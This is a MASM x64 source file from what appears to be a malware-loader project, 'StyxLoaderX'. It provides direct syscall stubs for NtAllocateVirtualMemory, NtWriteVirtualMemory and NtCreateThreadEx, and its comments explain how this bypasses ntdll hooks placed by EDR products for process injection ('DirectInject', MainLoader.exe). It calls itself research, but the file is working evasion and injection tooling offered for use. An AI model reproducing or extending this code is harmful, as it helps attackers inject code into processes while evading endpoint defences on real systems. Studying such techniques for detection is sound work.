; StyxLoaderX — Direct syscall stubs (MASM x64)
; =============================================================================
;
; This file provides MASM stubs that perform the actual 'syscall' instruction
; with the correct Win32 x64 syscall calling convention.
;
; Background (see audit fix F9 / commit 3):
;
; The original DirectSyscall.cpp used MSVC inline __asm blocks which:
;   (a) Are NOT supported on MSVC x64 (only x86 MSVC supports inline asm).
;   (b) Contained 'mov rdx, rdx; mov r8, r8; mov r9, r9' auto-assignments
;       that failed to load any actual arguments into the syscall-ABI
;       registers (rcx, rdx, r8, r9). The syscall executed with garbage
;       register state and the kernel returned STATUS_ACCESS_VIOLATION.
;
; This file is the replacement. Each stub:
;   1. Reads the SSN (syscall service number) from a C-set global variable
;      g_ssn_<NtXxx>. C++ resolves these at runtime via GetSyscallNumber()
;      by parsing the ntdll stub for the 'mov eax, imm32; syscall' pattern.
;   2. Marshals the Win64 calling-convention arguments into the Win32
;      syscall ABI. Only one transformation is needed: arg1 moves from
;      rcx (Win64) to r10 (syscall ABI, because 'syscall' clobbers rcx
;      with rip). Args 2-4 stay in rdx/r8/r9. Args 5+ stay on the stack
;      at [rsp+28h]+ (the kernel sees them at the same offsets the Win64
;      caller placed them, since 'syscall' does not modify rsp).
;   3. Executes 'syscall' and returns. NTSTATUS is in eax (per ABI).
;
; References:
;   - j00ru's syscall table: https://j00ru.vexillium.org/syscalls/nt/64/
;   - MalwareTech "Syscalls in Windows" series
;   - Microsoft x64 calling convention docs
;   - SysWhispers / SysWhispers2 / SysWhispers3 (klezVirus) for the pattern
;
; Build:
;   ml64.exe /nologo /c /Cp modules\asm\styx_syscalls.asm
;   (Produces styx_syscalls.obj, linked into MainLoader.exe)
;
; Limitations (intentional, scope-bounded for research):
;   - SSNs are resolved once at startup; no randomization (Hell's Gate /
;     Halo's Gate / Tartarus' Gate are out of scope — see CONTRIBUTING.md).
;   - No hook detection on the parsed ntdll stubs (if an EDR hooks ntdll,
;     GetSyscallNumber may return a wrong SSN; this is documented as a
;     known limitation in the whitepaper).
;   - SSNs are stored in globals (not thread-local). Not thread-safe for
;     concurrent calls to DirectInject; acceptable for research use.

EXTERN g_ssn_NtAllocateVirtualMemory:DWORD
EXTERN g_ssn_NtWriteVirtualMemory:DWORD
EXTERN g_ssn_NtCreateThreadEx:DWORD

.CODE

; NTSTATUS StyxNtAllocateVirtualMemory(
;     HANDLE ProcessHandle,          ; rcx -> r10
;     PVOID* BaseAddress,            ; rdx
;     ULONG_PTR ZeroBits,            ; r8
;     PSIZE_T RegionSize,            ; r9
;     ULONG AllocationType,          ; [rsp+28h]
;     ULONG Protect                  ; [rsp+30h]
; );
StyxNtAllocateVirtualMemory PROC
    mov r10, rcx                              ; arg1 from Win64 rcx to syscall ABI r10
    mov eax, DWORD PTR [g_ssn_NtAllocateVirtualMemory]  ; SSN from C-set global
    syscall
    ret
StyxNtAllocateVirtualMemory ENDP

; NTSTATUS StyxNtWriteVirtualMemory(
;     HANDLE ProcessHandle,          ; rcx -> r10
;     PVOID BaseAddress,             ; rdx
;     PVOID Buffer,                  ; r8
;     SIZE_T NumberOfBytesToWrite,   ; r9
;     PSIZE_T NumberOfBytesWritten   ; [rsp+28h]
; );
StyxNtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_ssn_NtWriteVirtualMemory]
    syscall
    ret
StyxNtWriteVirtualMemory ENDP

; NTSTATUS StyxNtCreateThreadEx(
;     PHANDLE ThreadHandle,          ; rcx -> r10
;     ACCESS_MASK DesiredAccess,     ; rdx
;     POBJECT_ATTRIBUTES ObjAttr,    ; r8
;     HANDLE ProcessHandle,          ; r9
;     PVOID StartRoutine,            ; [rsp+28h]
;     PVOID Argument,                ; [rsp+30h]
;     ULONG CreateFlags,             ; [rsp+38h]
;     SIZE_T ZeroBits,               ; [rsp+40h]
;     SIZE_T StackSize,              ; [rsp+48h]
;     SIZE_T MaximumStackSize,       ; [rsp+50h]
;     PPS_ATTRIBUTE_LIST AttrList    ; [rsp+58h]
; );
StyxNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, DWORD PTR [g_ssn_NtCreateThreadEx]
    syscall
    ret
StyxNtCreateThreadEx ENDP

END
